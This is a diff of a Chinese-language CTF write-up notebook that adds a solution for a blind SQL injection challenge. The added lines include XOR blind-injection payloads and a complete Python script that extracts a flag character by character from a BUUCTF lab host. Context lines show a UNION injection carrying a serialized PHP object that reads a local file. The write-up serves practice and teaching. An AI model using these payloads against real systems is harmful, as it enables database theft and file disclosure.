@@ -620,10 +620,40 @@ NOTE:这是一道盲注题
 输入0与输入1的回显不同说明：
 ```
 条件为真 回显 Hello,gzlwantsgirlfriend
-条件为假 回显 Error occur when fetch result
+条件为假 回显 Error occured when fetch result
 ```
 那么可以使用==异或盲注==：
-`0^if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,0)`
+`0^if((length(database())>=11),1,0)`测试数据库长度
+测到12回显Error occured when fetch result
+编写python脚本：
+```python
+import requests
+import time
+from datetime import datetime
+result=""
+RF = 0
+url="http://ce122f55-3942-442e-ada8-cdc8257d4e3a.node4.buuoj.cn:81"
+st = time.time()
+for i in range(1,60):
+    if RF == 1:
+        break
+    for j in range(32,128):
+        payload="0^if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,0)"%(i,j)
+        data={"id":payload}
+        r=requests.post(url,data)
+        r.encoding=r.apparent_encoding
+        if "Hello" in r.text:
+            result+=chr(j)
+            print("Fetched: " + result + " [%s]"%(datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
+            break
+        if "}" in result:
+            RF = 1
+            et = time.time()
+            print(result,"\n[Elapsed Time] %fs"%(et - st))
+            break
+```
+解释：对flags表的flag列的数据进行测试，如果为字符，条件为真，则回显中有Hello，同时将遍历到的字符写入result。当遍历到}时，说明flag获取完毕。
+运行脚本，拿到flag。
 [网鼎杯 2018]Fakebook #PHP反序列化漏洞  #ssrf利用
 进入环境，有login,join两个功能，在login尝试直接sqli全部返回loginfailed，直接进行sqli是不可行的。
 在join页面创建账号与blog也全部返回blog is not valid.
@@ -706,6 +736,7 @@ class UserInfo
 `/view.php?no=0+union/**/select+1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`
 直接在第四列data的位置上填上序列化后的对象。
 访问页面查看源码，拿到base64的flag,解码后拿到flag。
+[RoarCTF 2019]Easy Java
 [网鼎杯 2020 朱雀组]phpweb1 #命令执行漏洞 #PHP反序列化漏洞 
 进入看到孙笑川以及报错的文字：
 ```
